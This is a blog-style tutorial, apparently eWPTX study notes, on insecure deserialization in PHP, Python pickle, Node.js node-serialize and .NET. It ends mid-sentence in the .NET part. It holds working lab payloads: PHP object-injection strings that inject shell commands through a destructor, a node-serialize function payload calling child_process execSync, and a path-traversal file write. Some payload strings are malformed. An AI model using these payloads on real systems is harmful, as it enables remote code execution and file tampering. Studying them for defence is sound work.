[
  
  {
    "title": "Understanding Attack Serialization: An Introduction",
    "url": "/posts/Attacking-Serialization/",
    "categories": "Study, Attack Serialization",
    "tags": "",
    "date": "2024-07-31 00:00:00 -0300",
    





    
    "snippet": "Today, we will discuss serialization and the risks associated with this technique. Serialization is a common technique used in software development to convert complex objects into a format that can...",
    "content": "Today, we will discuss serialization and the risks associated with this technique. Serialization is a common technique used in software development to convert complex objects into a format that can be easily stored or transmitted. This process allows data to be saved in files, sent over networks, or passed between different components of an application. However, serialization also introduces significant security risks if not properly managed. When an application deserializes untrusted data, it becomes vulnerable to various attacks.Initial ConceptSerialization is the name of the mechanism that allows us to store the state of programmistic objects in a sequency of bytes in a reversible way.This way, an object can be transported remotely to another program.The receiving endpoint should be able to reconstruct - deserialize - the received object in an unchanged state.Serialization is used widely in programming and can be used for  Storing and transferring data  Calling remote procedures (RPC-like methods)Serializing data is also often referred to as marshalling. The reverse process of retrieving the original object out of a byte sequence is called deserialization or unmarshallingSerialized data itself is not encrypted or signed in any way. Often, the data might be freely tampered with once spotted, which might bring unexpected results on the deserializing component.Serialized objects are most often encountered in WebAPP written in PHP, Java, .NET, but serialization is not limited to these languages only.Serialization might not ONLY be present on the WebAPP layer. An serialized object can be:Pop chain/Object chain/Object injectionIn the context of security vulnerabilities, these terms refer to techniques where objects within a system are concatenated, often leveraging third-party libraries. By creating a chain of functions, attackers can manipulate requests and potentially execute arbitrary code within the system.Serialization in PHPIn PHP, there are ‘magic functions.’ These are predefined functions that you don’t need to create yourself, and they have specific purposes.For example, the __construct() function is used as a constructor method:public function __construct() {    if (isset($_SESSION['user'])) {        $this-&gt;user = $_SESSION['user'];        $this-&gt;role = $_SESSION['role'];        $this-&gt;isauth = true;    }}Additionally, there is something akin to a ‘garbage collector,’ which can handle tasks like deleting files. This can be done using the __destruct() function:public function __destruct() {    shell_exec(\"rm -rf \" . escapeshellarg($this-&gt;path) . \"*\");}These magic functions in PHP provide automatic handling of object initialization and cleanup, making your code more efficient and easier to manage.Abusing control over PHP serialized object is also called PHP Object InjectionPHP uses the serialize() and unserialize() functions to perform serialization  (de)serializationis used to store/transfer/transform whole objects → Like in Java  Serialization is in non-binary format - Similar to a JSON array / Human-readable → Unlike JavaPHP serialized string looks like0:6:,,Abcdef\":1:{s:9:,,Something\";s:6:\"Active\";}PHP Serialized objects contain information about the type of object → Necessary for reconstruction.Booleans b:&lt;i&gt;;  i is  0 or 1  (True / False)Strings s:&lt;i&gt;:\"&lt;s&gt;\";  i is the string length  s is the string itselfArrays a:&lt;i&gt;:{&lt;elements&gt;}  i is the number of elements in the array (integer)  elements are zero or more serialized key value pairs of the form &lt;key&gt;&lt;value&gt;Objects (classes) O:&lt;i&gt;:\"&lt;s&gt;\":&lt;i&gt;:{&lt;properties&gt;}  First &lt;i&gt; is the string length of &lt;s&gt; (integer)  &lt;s&gt; is the fully qualified class name  Second &lt;i&gt; number of object properties (integer)  &lt;properties&gt; zero or more serialized name-value pairs &lt;name&gt;&lt;value&gt;          &lt;name&gt; is a serialized string representing the property name s:&lt;i&gt;:\"&lt;s&gt;\"                  &lt;i&gt; is the string length of &lt;s&gt;                    &lt;value&gt; is any value that is serializable      The visibility of properties influences the value of &lt;s&gt;  Public Properties → simple name of the property  Protected Properties → “ + prepended with \\0*\\0 - asterix enclosed in two NULL bytes (0x00)  Private Properties →  “ + prepended with \\0&lt;s&gt;\\0 - enclosed in two NULL bytes, where &lt;s&gt; is the fully qualified class nameIn WebAPP might often encounter the PHP serialized data to be base64 encoded for transportation purposes.Exploitation StrategiesPHP object injection isn’t straightforward as its Java counterpart and depends heavily on the details of each vulnerabilityThere’s no ysoserial for php that gives easy RCE.Relies heavily on HOW the unserialized data is further handled.Unserialized data isn’t necessarily used unless some magic methods are in place.Magic methods are functions available to be used in PHP Object-Oriented Programming. They’re functions that are being launched dynamically once a certain trigger is present.They can be recognized in code by two underscores in the beginning of their names. Triggers:  __construct() → Loaded upon creating a new instance of a class  __destruct() → Loaded when no more references of a current class are present in memory  __wakeUp() → Loaded upon deserializing an objectExample Code&lt;?phpdefine ('LOG', '/tmp/');class DoLog{\tprivate $filepath;\tpublic function __construct()\t{\t\t$this-&gt;filepath = LOG . \"history.log\";\t\ttouch($this-&gt;filepath);\t\t}\t\tpublic function __destruct()\t{\t\techo \"\\n[+] Logfile \" . ($this-&gt;filepath) . \"is beign removed\\n\";\t\tunlink($this-&gt;filepath);\t}}$log = new DoLog();var_Export(serialize($log));?&gt;  Upon creating a new instance of the class, it creates a log file (default constructor)  File is then removed (default destructor)The file will also output serialized data about the created class object.php v.php'O:5:\"DoLog\":1:{s:15:\"' . \"\\0\" . 'DoLog' . \"\\0\" . 'filepath\";s:16:\"/tmp/history.log\";}'Modifying the code by adding unserialization logic&lt;?phpdefine ('LOG', '/tmp/');class DoLog{\tprivate $filepath;\tpublic function __construct()\t{\t\t$this-&gt;filepath = LOG . \"history.log\";\t\ttouch($this-&gt;filepath);\t\t}\t\tpublic function __destruct()\t{\t\techo \"\\n[+] Logfile \" . ($this-&gt;filepath) . \"is beign removed\\n\";\t\tunlink($this-&gt;filepath);\t}}$log = new DoLog();var_Export(serialize($log));$serialized = 'O:5:\"DoLog\":1:{s:15:\"' . \"\\0\" . 'DoLog' . \"\\0\" . 'filepath\";s:16:\"/tmp/history.log\";}';$o = unserialize($serialized);?&gt;Upon deserialization, the class’s magic methods will be run so that the file will be removed in the destructor functionphp v.phpThe program tried to remove the log file twice, once upon the legitimate class instantiation and once upon the deserializationTry to delete the arbitrary file. First need to create the history.lol file  → Which has an equal filename length compared to the log fileNow, the $serialized will be altered and history.log will be replaced with history.lol$serialized = 'O:5:\"DoLog\":1:{s:15:\"' . \"\\0\" . 'DoLog' . \"\\0\" . 'filepath\";s:16:\"/tmp/history.lol\";}';$o = unserialize($serialized);php v.phpThe destructor function to be run on the history.lol file which was removed. This way, we were able to manipulate serialized PHP data in order to alter the original behavior of the file.In the real world, such data often comes from other sources, for example, HTTP request parameters.Exploitation of such vulnerability was possible because:  Had access to the source code  Had access to the original serialized payload → knew what to alter in it  Vulnerable function was implemented in the default destructor → data was used after the deserialization - There could be a case when data is unserialized but not used in a insecure manner.“Simple” Exampleindex.php&lt;?phprequire_once(\"classes/Auth.class.php\");require_once(\"classes/FileManager.class.php\");if($_COOKIE['session'] and !empty($_COOKIE['session'])){    $session = unserialize($_COOKIE['session']);    if($session-&gt;isAuth()) {        echo \"está autenticado\";    } else {        $session = new Auth();        setcookie(\"session\", serialize($session), time() + 3600);        echo \"não está autenticado\";    }} else {    $session = new Auth();    setcookie(\"session\", serialize($session), time() + 3600);    echo \"não está autenticado\";}?&gt;Auth.class.php&lt;?phpclass Auth{    public $user = \"guest\";    public $role = \"guest\";    public $session_status = false;    public function isAuth() {        return $this-&gt;session_status;    }    public function isAdmin() {        if ($this-&gt;role == \"admin\") {            return true;        } else {            return false;        }    }    public function doAuth($user, $password) {        if ($user == \"admin\" &amp;&amp; $password == \"admin\") {            return true;        } else {            return false;        }    }}?&gt;FileManager.class.php&lt;?php class FileManager {    public $path = \"/home/kali/Desktop/eWPTX/serialization/insegura/tmp/\";    public function __construct() {        file_put_contents($this-&gt;path . \"log.txt\", \"Sessão iniciada no File Manager!\");    }    public function putlog($content) {        file_put_contents($this-&gt;path . \"log.txt\", $content);    }    public function readLog() {        return file_get_contents($this-&gt;path . \"log.txt\");    }    public function __destruct() {        shell_exec(\"rm -rf \" . escapeshellarg($this-&gt;path) . \"*\");    }}?&gt;The application checks user authentication using cookies that store serialized session objects. If the session does not exist or is not authenticated, a new session is created and serialized into the cookie. The FileManager class manages session logs and cleans up temporary files when destroyed.So, if you verify the cookies in the browser you can see that the value is\"session\": O%3A4%3A%22Auth%22%3A3%3A%7Bs%3A4%3A%22user%22%3Bs%3A5%3A%22guest%22%3Bs%3A4%3A%22role%22%3Bs%3A5%3A%22guest%22%3Bs%3A14%3A%22session_status%22%3Bb%3A0%3B%7DIf you use an urldecode you can see the serialized parameters of the object.O:4:\"Auth\":3:{s:4:\"user\";s:5:\"guest\";s:4:\"role\";s:5:\"guest\";s:14:\"session_status\";b:0;}So to bypass the requisition, you can do this:O:4:\"Auth\":3:{s:4:\"user\";s:5:\"guest\";s:4:\"role\";s:5:\"guest\";s:14:\"session_status\";b:1;}And then url encoded itO%3A4%3A%22Auth%22%3A3%3A%7Bs%3A4%3A%22user%22%3Bs%3A5%3A%22guest%22%3Bs%3A4%3A%22role%22%3Bs%3A5%3A%22guest%22%3Bs%3A14%3A%22session_status%22%3Bb%3A1%3B%7DSo this will trigger the function    if($session-&gt;isAuth()) {        echo \"está autenticado\";    }But, if we instance the file manager.index.php    if($session-&gt;isAuth()) {        echo \"está autenticado\";        echo \"&lt;br&gt;\";        $fileManager = new FileManager();        $fileManager-&gt;putlog(\"Sessão iniciada no File Manager!\");        $log = $fileManager-&gt;readLog();        echo $log;    } So after enter in the page with the session cookie, we can that that he created an file and then he deletes it.┌──(kali㉿kali)-[~/…/eWPTX/serialization/insegura/tmp]└─$ ls -la total 12drwxr-xr-x 2 kali kali 4096 Jul 25 15:52 .drwxr-xr-x 5 kali kali 4096 Jul 25 15:18 ..-rw-r--r-- 1 kali kali   33 Jul 25 15:52 log.txt                                                                                                                                                                               ┌──(kali㉿kali)-[~/…/eWPTX/serialization/insegura/tmp]└─$ cat log.txt  Sessão iniciada no File Manager!                                                                                                                                                                               So in this specific function in the File Manager, we have a possible command injection vulnerability.    public function __destruct() {        shell_exec(\"rm -rf \" . escapeshellarg($this-&gt;path) . \"*\");    }This happens because it takes a variable from the FileManager class, in this case, the path. When unserializing:    $session = unserialize($_COOKIE['session']);The code does NOT validate which object is being deserialized, so instead of passing the serialized “Auth” object, one could pass the FileManager object:O:11:\"Filemanager\":1:{s:4:\"path\";s:25:\"/tmp/auth; sleep 5; echo \"}Then, after encoding and sending it to the server, the following error occurs:[Thu Jul 25 16:18:27 2024] 127.0.0.1:42376 Accepted[Thu Jul 25 16:18:27 2024] PHP Notice:  unserialize(): Error at offset 65 of 66 bytes in /home/kali/Desktop/eWPTX/serialization/insegura/index.php on line 6[Thu Jul 25 16:18:27 2024] PHP Fatal error:  Uncaught Error: Call to a member function isAuth() on bool in /home/kali/Desktop/eWPTX/serialization/insegura/index.php:8Stack trace:#0 {main}  thrown in /home/kali/Desktop/eWPTX/serialization/insegura/index.php on line 8[Thu Jul 25 16:18:27 2024] 127.0.0.1:42376 [500]: GET / - Uncaught Error: Call to a member function isAuth() on bool in /home/kali/Desktop/eWPTX/serialization/insegura/index.php:8Stack trace:#0 {main}  thrown in /home/kali/Desktop/eWPTX/serialization/insegura/index.php on line 8It performs the deserialization and immediately calls the isAuth() function:    $session = unserialize($_COOKIE['session']);    if($session-&gt;isAuth()) {However, what matters is that since it calls a function from the session, it does NOT directly call the FileManager class because it only calls __destruct when PHP finishes interpreting the class. Therefore, you need a method where PHP forces the __destruct directly.Consider the following code:&lt;?phpclass test {    public function __destruct() {        echo \"test\";    }}$wtf = unserialize('a:2:{i:7;O:4:\"test\":0:{}i:7;i:7;}');$wtf-&gt;test();?&gt;We have an array with two positions a:2; the first position is named 7 and its value is an object 0:4:\"Test\":0:{}. However, it is not specified at the end of the function that it will initiate another object {}i (usually there is a ; at the end, making it {};i). When running, it indicates that the encoding is incorrect, but even so, it executes the value test.┌──(kali㉿kali)-[~/Desktop/eWPTX/serialization/insegura]└─$ php test.php              testPHP Fatal error:  Uncaught Error: Call to a member function test() on array in /home/kali/Desktop/eWPTX/serialization/insegura/test.php:10Stack trace:#0 {main}  thrown in /home/kali/Desktop/eWPTX/serialization/insegura/test.php on line 10This happens because PHP still creates the Test object before processing the rest of the serialized string. The destructor is called when the object is destroyed, which happens when the deserialization process ends or when the script ends.But this ALWAYS happens when an invalid array value is passed. For example, consider the following request:&lt;?phpclass test {    public function __destruct() {        echo \"test 123\";    }}echo serialize(array('payload'=&gt;new test()));?&gt;test 123a:1:{s:7:\"payload\";O:4:\"test\":0:{}}                                                                                                                                                                               Assigning this to the unserialized variable$wtf = unserialize('a:1:{s:7:\"payload\";O:4:\"test\":0:{}}');$wtf-&gt;test();It will give an error because the test function does not exist, which is correct.──(kali㉿kali)-[~/Desktop/eWPTX/serialization/insegura]└─$ php test.phpPHP Fatal error:  Uncaught Error: Call to a member function test() on array in /home/kali/Desktop/eWPTX/serialization/insegura/test.php:10Stack trace:#0 {main}  thrown in /home/kali/Desktop/eWPTX/serialization/insegura/test.php on line 10However, if we change the array size value:$wtf = unserialize('a:2:{s:7:\"payload\";O:4:\"test\":0:{}}');The __destruct command is executed:┌──(kali㉿kali)-[~/Desktop/eWPTX/serialization/insegura]└─$ php test.phpPHP Notice:  unserialize(): Unexpected end of serialized data in /home/kali/Desktop/eWPTX/serialization/insegura/test.php on line 9PHP Notice:  unserialize(): Error at offset 34 of 35 bytes in /home/kali/Desktop/eWPTX/serialization/insegura/test.php on line 9**test 123**PHP Fatal error:  Uncaught Error: Call to a member function test() on bool in /home/kali/Desktop/eWPTX/serialization/insegura/test.php:10Stack trace:#0 {main}  thrown in /home/kali/Desktop/eWPTX/serialization/insegura/test.php on line 10Now, adapting this to the previously worked application scenario:exploit-fast-destruct.php&lt;?phpclass FileManager {    public $path = \"/tmp/aula;sleep 5; echo \";}echo serialize(array('payload'=&gt;new FileManager()));?&gt;Then change it to two positions and encode it.a:2:{s:7:\"payload\";O:11:\"FileManager\":1:{s:4:\"path\";s:25:\"/tmp/aula/;sleep 5; echo \";}}We can see that it worked because it waited 5 seconds:[Thu Jul 25 17:00:30 2024] PHP Fatal error:  Uncaught Error: Call to a member function isAuth() on array in /home/kali/Desktop/eWPTX/serialization/insegura/index.php:8Stack trace:#0 {main}  thrown in /home/kali/Desktop/eWPTX/serialization/insegura/index.php on line 8[Thu Jul 25 17:00:30 2024] 127.0.0.1:53154 [500]: GET / - Uncaught Error: Call to a member function isAuth() on array in /home/kali/Desktop/eWPTX/serialization/insegura/index.php:8Stack trace:#0 {main}  thrown in /home/kali/Desktop/eWPTX/serialization/insegura/index.php on line 8[Thu Jul 25 17:00:35 2024] 127.0.0.1:53154 Closing[Thu Jul 25 17:00:35 2024] 127.0.0.1:53162 AcceptedNow you need to modify the exploit to create a file, for example:public $path = \"/tmp/aula;id&gt;/tmp/path; echo \";Sending the payload:a:2:{s:7:\"payload\";O:11:\"FileManager\":1:{s:4:\"path\";s:29:\"/tmp/aula;id&gt;/tmp/path; echo \";}} Checking the file, it was possible to execute commands:┌──(kali㉿kali)-[/tmp]└─$ cat path         uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),116(scanner),138(wireshark),141(kaboxer)If the __destruct is in the following format:public function isAuth(){    if($this-&gt;auth){        return true;    } else {\t      return false;    }}public function __destruct() {    if($this-&gt;role == \"admin\"){        file_put_contents(\"/tmp/\".$this-&gt;username, serialize($this));    }}O:4:\"Auth\":3:{s:4:\"auth\";i:1:\"guest\";s:5:\"admin\";s:4:\"role\";s:5:\"admin\";s:4;}In this case, it writes the content of the current class into a file. There are two vulnerabilities:If the username is ../../var/www/html/test.php, it will create this file with just the class content. However, if you put it this way, it will only write the class content.Another thing is, since it uses the comparison if($this-&gt;auth), this is equivalent to if($this != 0 || $this != NULL), meaning we could modify the contentO:4:\"Auth\":3:{s:4:\"auth\";s:18:\"&lt;?php phpinfo();?&gt;\";s:27:\"../../var/www/html/test.php\";s:4:\"role\";s:5:\"admin\";s:4;}Other SerializationWhen looking for deserialization vulnerabilities, should AWAYS pay attention to data that  Contain strings that are similar to method names or object names  Contain binary data  Is in a complex, structured formSource code of the target software is available, should inspect it for the presence of serialization-related methodsPythonSerialized objects in Python are binary and not human-readable.Additionally, in Python, there is a method similar to the __destruct magic method in PHP called __reduce. What is very convenient is that it is possible to control this __reduce function. Furthermore, there is no default function for serialization in Python; you need to import a library called pickle.Initial Exampleimport pickleclass Example(object):    def show_example(self, name):        print(\"Hello, \" + name)    deserialization_example = Example()deserialization_example.show_example(\"World\")serialized_object = pickle.dumps(deserialization_example) # serialize the objectprint(serialized_object)new_object = pickle.loads(serialized_object) # unserialize the objectnew_object.show_example(\"Show example without serialization\")OutputHello, Worldb'\\x80\\x04\\x95\\x1b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x07example\\x94\\x93\\x94)\\x81\\x94.'Hello, Show example without serializationOnce you have control of the value that will be deserialized deserialization_example, it is possible to execute remote code.Remembering the __reduce__ method, note the following example.import pickleclass example(object):    def __reduce__(self):        return (print, (\"test\", ))        def show_example(self, name):        print(\"Hello, \" + name)    desserialization_example = example()desserialization_example.show_example(\"World\")serialized_object = pickle.dumps(desserialization_example) # serialize the objectprint(serialized_object)new_object = pickle.loads(serialized_object) # unserialize the objectnew_object.show_example(\"Show example without serialization\")Hello, Worldb'\\x80\\x04\\x95\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08builtins\\x94\\x8c\\x05print\\x94\\x93\\x94\\x8c\\x05teste\\x94\\x85\\x94R\\x94.'testTraceback (most recent call last):  File \"c:\\Users\\arthu\\Desktop\\eWPTX\\example.py\", line 19, in &lt;module&gt;    new_object.show_example(\"Show example without serialization\")    ^^^^^^^^^^^^^^^^^^^^^^^AttributeError: 'NoneType' object has no attribute 'show_example'Note that it serialized the object with the print function. After that, when it was deserialized, the “test” was called.However, note that an error also occurred. This happens because when __reduce__ is used, everything in the object is ignored, and only the return value of the function is “carried along.”Now imagine in a new context.import pickle class malicous_code(object):    def __reduce__(self):        return (print, (\"I am a malicious code\",))    object_malicous = pickle.dumps(malicous_code())print(object_malicous)pickle.loads(object_malicous)b'\\x80\\x04\\x952\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08builtins\\x94\\x8c\\x05print\\x94\\x93\\x94\\x8c\\x15I am a malicious code\\x94\\x85\\x94R\\x94.'I am a malicious codeTaking the output value and passing it directly into pickle.loadsimport pickle pickle.loads(b\"\\x80\\x04\\x952\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08builtins\\x94\\x8c\\x05print\\x94\\x93\\x94\\x8c\\x15I am a malicious code\\x94\\x85\\x94R\\x94.\")I am a malicious codeTherefore, if it is possible to obtain control of the object in pickle.loads, you have control of the application.NodeJSJust like in Python, the serialization library is not default in Node.js. The library that contains functions to serialize/deserialize objects is called node-serialize.However, unlike Python, it is human-readable.Consider the following example, where it is desirable to manipulate an object to transform it into JSON:const nodeserialize = require('node-serialize');let user = {};user.name = 'Hendrich';user.email = 'hendrich@blog.com.br'serialziedObj = nodeserialize.serialize(user);console.log(\"Serialzied Object: \");console.log(serialziedObj);unserializeObj = nodeserialize.unserialize(serialziedObj);console.log(\"Unserialzied Object: \");console.log(unserializeObj);Serialzied Object: {\"name\":\"Hendrich\",\"email\":\"hendrich@blog.com.br\"}Unserialzied Object: { name: 'Hendrich', email: 'hendrich@blog.com.br' }The cool thing is that it is possible to pass functions within the parameter, just like in Python. There is no magic method responsible for instantiating the class.You can instantiate a function within the object. For example:const nodeserialize = require('node-serialize');let user = {};user.name = 'Hendrich';user.email = 'hendrich@blog.com.br'user.getDetails = function() {    return \"test\";}serialziedObj = nodeserialize.serialize(user);console.log(serialziedObj);{\"name\":\"Hendrich\",\"email\":\"hendrich@blog.com.br\",\"getDetails\":\"_$$ND_FUNC$$_function() {\\r\\n    return \\\"test\\\";\\r\\n}\"}In other words, it also serializes the function, allowing it to be reused from one location to another. Now, see what happens when deserializing:const nodeserialize = require('node-serialize');let user = {};user.name = 'Hendrich';user.email = 'hendrich@blog.com.br'user.getDetails = function() {    return \"test\";}serialziedObj = nodeserialize.serialize(user);obj = nodeserialize.unserialize(serialziedObj);console.log(obj.getDetails());testObviously, if this happens within the context of a Node.js application where it serializes a function, then sends it to the user’s browser to be used in an application, it would be possible to modify the function to achieve RCE. But this does NOT happen in real scenarios (or at least I’ve never seen it).However, there is a scenario where, during unserialization, it is possible to force the function to be called.Observe the following code:const nodeserialize = require('node-serialize');let user = {};user.name = 'Hendrich';user.email = 'hendrich@blog.com.br'user.getDetails = function() {    console.log(\"test\");}serialziedObj = nodeserialize.serialize(user);obj = nodeserialize.unserialize(serialziedObj);console.log(obj);{  name: 'Hendrich',  email: 'hendrich@blog.com.br',  getDetails: [Function (anonymous)]}Note that it did not call console.log(\"test\").Observing the JSON parameter formed during serialization, you can see that the function indeed exists, but why wasn’t it executed?{    \"name\": \"Hendrich\",    \"email\": \"hendrich@blog.com.br\",    \"getDetails\": \"_$$ND_FUNC$$_function() {\\r\\n    console.log(\\\"test\\\");\\r\\n}\"}To force the execution of this function during deserialization, you need to modify it as follows:{    \"name\": \"Hendrich\",    \"email\": \"hendrich@blog.com.br\",    \"getDetails\": \"_$$ND_FUNC$$_function() {\\r\\n    console.log(\\\"test\\\");\\r\\n}()\"}This happens because during the deserialization process, it is necessary not only to instantiate a function but also to call it for execution.&gt; nodeserialize = require('node-serialize');{  serialize: [Function (anonymous)],  unserialize: [Function (anonymous)]}&gt; nodeserialize.unserialize('{\"myFunction\":\"_$$ND_FUNC$$_function(){console.log(\\'JUST DONT\\')}\"}');{ myFunction: [Function (anonymous)] }&gt;It even identifies that it is a function but nothing happens. Now, adding () at the end of the function creation:&gt; nodeserialize.unserialize('{\"myFunction\":\"_$$ND_FUNC$$_function(){console.log(\\'JUST DONT\\')}()\"}');JUST DONT{ myFunction: undefined }&gt;Thus, it is possible to generate a serialized object, obtain it, and modify it with the desired value for execution and add the () at the end.In this way, it is necessary to understand what is inside the JSON, manipulate the values, and send them to the backend.It is possible that an application sets a session cookie as JSON:{\"username\": \"hendrich@blog.com.br\", \"id\": 12453464564.2675}So, in the place of the username, you could pass a malicious function to it:const nodeserialize = require('node-serialize');let user = {};user.username= function() {require('child_process').execSync('sleep 5')};user.id = 12453464564.2675serialziedObj = nodeserialize.serialize(user);console.log(serialziedObj);{\"username\":\"_$$ND_FUNC$$_function() {require('child_process').execSync('sleep 5')}\",\"id\":12453464564.2675}Note: The child_process library is built-in in Node.js, so there is no need to worry.Now making some modifications to the output, note that in addition to (), a return value will be added to the function with the same value previously obtained in the initial request to avoid conflicting with the expected behavior of the application:{    \"username\": \"_$$ND_FUNC$$_function() {require('child_process').execSync('sleep 5');return \"hendrich@blog.com.br\";}()\",    \"id\": 12453464564.2675}In this case, note that the one unserializing could be an API and not the application itself.For this application, this could be the back-end:const nodeserialize = require('node-serialize');const express = require('express');const cookieParser = require('cookie-parser');const fs = require('fs');const app = express();app.use(cookieParser());app.get('/api/verify', (req, res) =&gt; {    res.setHeader('Content-Type', 'application/json');    if (req.cookies.session) {        try {            let userInfo = nodeserialize.unserialize(req.cookies.session);            let rawdata = fs.readFileSync('users.json');            let users = JSON.parse(rawdata);            let valid_user = false;            users.forEach(user =&gt; {                if (user.username === userInfo.username &amp;&amp; user.password === userInfo.password) {                    valid_user = true;                }            });            res.json({status: valid_user});        } catch (error) {            res.status(500).json({status: false, error: 'Invalid session data'});        }    } else {        res.status(400).json({status: false, error: 'No session cookie found'});    }});app.listen(3000, () =&gt; {    console.log('Server running on port 3000');});The application directly unserializes the session cookie using node-serialize without validating or sanitizing the input. This allows an attacker to craft a malicious serialized object and send it as a cookie.Pop Chains ConceptCode-reuse / POP-Attack refers to utilizing existing parts of the application to manipulate it as desired.In other words, it involves chaining existing properties of the application to execute a specific action, such as RCE, SQL Injection, etc.Attack SurfaceIn most programming languages, there are three main pillars: Code, Libraries (libs), and Frameworks.In languages like Java and .NET, there is another pillar: the Operating System (OS), where it is possible to use the runtime of the OS in the insecure deserialization process, executing built-in system functions.In most applications, frameworks dominate the majority of the code. Next are the libraries used in the application to avoid rewriting large parts of the code. Then, the code written by the developer.Often, the popchain process is used on the libraries and frameworks instead of directly attacking the developed application. Thus, a serialization gadget is manually assembled, reusing code (Code-reuse attack) to execute a specific action.Code Review in ApplicationsExample 01: Code with vulnerability created by the developer.index.php&lt;?phprequire_once \"class/Auth.class.php\";$auth = new Auth();if($auth-&gt;isLogged() and $auth-&gt;isSuperUser()) {    echo \"Welcome, super user!\";} else {    echo \"You are not logged in or you are not a super user!\";}?&gt;Auth.class.php&lt;?php class Auth{    public $auth = 0;    public $name = 'randomUser';    public $role = 'guest';    public function __construct(){        if(isset($_COOKIE['session']) and !empty($_COOKIE['session'])){            $session = unserialize(base64_decode($_COOKIE['session'])); # 1            $this-&gt;auth = $session['auth'];            $this-&gt;name = $session['name'];            $this-&gt;role = $session['role'];            return $this;        } else {            setcookie('session', base64_encode(serialize($this)), time() + 3600, '/');            return $this;        }    }    public function isLogged(){        if($this-&gt;auth){            return true;        } else {            return false;        }    }    public function isSuperUser(){        if($this-&gt;role == 'superuser'){            return true;        } else {            return false;        }    }    public function __destruct() {        if($this-&gt;role == 'superuser'){            echo \"Welcome, super user!\";            file_put_contents('superuser.txt'.$this-&gt;name, serialize($this)); # 2        } else {            echo \"You are not logged in or you are not a super user!\";        }    }}1:  Insecure deserialization. It is deserializing data coming directly from the user.2: Path Traversal, the username becomes ../../../../../var/html/shell.php and writes the session cookie content.Example 02: Code with vulnerability generated from using a LIB.In this case, the Laravel framework will be used. If you want to simulate it, here are the docker configurations.docker-compose.ymlversion: '3.8'services:  app:    build:      context: .      dockerfile: Dockerfile    container_name: laravel_app    ports:      - \"9000:9000\"    volumes:      - ./app:/var/www/html    working_dir: /var/www/html    command: bash -c \"composer install &amp;&amp; php-fpm\"  web:    image: nginx:alpine    container_name: laravel_web    ports:      - \"8080:80\"    volumes:      - ./app:/var/www/html      - ./nginx.conf:/etc/nginx/conf.d/default.conf    depends_on:      - app  composer:    image: composer:latest    container_name: laravel_composer    volumes:      - ./app:/var/www/html    working_dir: /var/www/html    command: bash -c \"composer create-project --prefer-dist laravel/laravel .\"DockerfileFROM php:8.2-fpmRUN apt-get update &amp;&amp; apt-get install -y \\    git \\    unzipRUN curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composerWORKDIR /var/www/htmlnginx.confserver {    listen 80;    index index.php index.html;    server_name localhost;    root /var/www/html/public;    location / {        try_files $uri $uri/ /index.php?$query_string;    }    location ~ \\.php$ {        fastcgi_pass app:9000;        fastcgi_index index.php;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        include fastcgi_params;    }}Commandsdocker-compose builddocker-compose up -ddocker-compose run --rm app composer installdocker-compose run --rm app php artisan key:generateObserve that inside the vendor folder there are various libraries installed by default in the application. The diversity of libraries installed does not necessarily mean they will all be used by you, not to mention the code that comes with them.This expands the possibilities that if any of these libraries have vulnerabilities, they can be exploited by an attacker in the application.For example, looking for libraries that execute a file_put_contentsIf somehow the parameters could be manipulated, RCE could be achieved through Code-reuse.Requirements to use Popchain and achieve RCE:  Trusted User Input:          The system must trust user inputs, such as in the case of unserialize or json_decode, where the data can be manipulated by the attacker.        Magic Methods:          Utilization of magic methods like __wakeup and __destruct which allow the execution of code during the deserialization and destruction of objects.        Gadget Chain:          Construction of a gadget chain. Gadgets are small pieces of existing code in the application that can be chained together to form a logical sequence that the attacker can control to achieve arbitrary code execution.        Code Reuse:          The ability to reuse existing code (in libraries, frameworks, or the application’s own code) to execute malicious actions, such as file_put_contents to write files or system to execute commands.      Serialization in .NETInstead of using just one universal method like serialize(), it uses a few different mechanisms for serialization and de-serialization of data.Data serialized using one of these mechanisms must be de-serialized using the same one.Saving the states of objects using serialization in .NET can be done using various methods.  BinaryFormatter → Serializes data to a binary file  DataContractSerializer → Serializes data to XML with more control over the serialization process through attributes.  NetDataContractSerializer → Similar to DataContractSerializer but includes .NET-specific type information, making it suitable for scenarios where both ends are .NET  XMLSerialization →  Serializes objects to XML, focusing on a simple and human-readable format.Each of these serialization types is connected directly to certain supported objects and types. Usage of them is situational and connected to .NET internalsGeneric way to attack using ysoserial.netIs a versatile tool and a .NET equivalent of java’s ysoserial.jarExemplifying BinaryFormatter serialization mechanism. - Now days is obsolete.NET console application → Application serializes a string and writes the output to a file - is in binary format, as per the name of the serialization logic.using System;using System.IO;using System.Runtime.Serialization.Formatters.Binary;using CenterSpace.NMath.Core;namespace CenterSpace.NMath.Core.Examples.CSharp {\tclass BinarySerializationExample \t{\t\tprivate const string filename = \"data.dat\";\t\t\t\tstatic void Main(string[] args)\t\t{\t\t\tConsole.WriteLine();\t\t\t\t\t// Delete old file, if it exists\t\t\tif (File.Exists(filename))\t\t\t{\t\t\t\tConsole.WriteLine(\"Deleting old file\");\t\t\t\tFile.Delete(filename);\t\t\t}\t\t\t\t\t\t// Create String\t\t\tvar u = \"Some String here\";\t\t\t\t\t\t// Persist to file\t\t\tFileStream stream = File.Create(filename);\t\t\tvar formatter = new BinaryFormatter(); // serialization mechanism \t\t\tConsole.WriteLine(\"Serializing string\");\t\t\tformatter.Serialize(stream, u)\t\t\tstream.Close();\t\t\t\t\t\t// Restore from file\t\t\tstream = File.OpenRead(filename);\t\t\tConsole.WriteLine(\"Deserializing string\");\t\t\tvar v = (String)formatter.Deserialize(stream);\t\t\tstream.Close();\t\t\t\t\t\tConsole.WriteLine();\t\t\tConsole.WriteLine(\"Press Enter Key\");\t\t\tConsole.Read();\t\t}\t}}type dataThe serialize data in the file, indeed, it`s in binary format.Thus, you can expect serialized .NET data encountered in WebAPP to be base64 encoded in order to conveniently send non-ASCII chars in HTTP requests and responses.A common, but not the only place where serialized data can be found is when data is sent in a VIEWSTATE parameter or .NET remoting services.NET remoting servicesCan be considered part of the WebAPP world but they`re also part of the infrastructure..NET remoting is the mechanics that allows sending pure .NET objects via TCP.However, depending on the 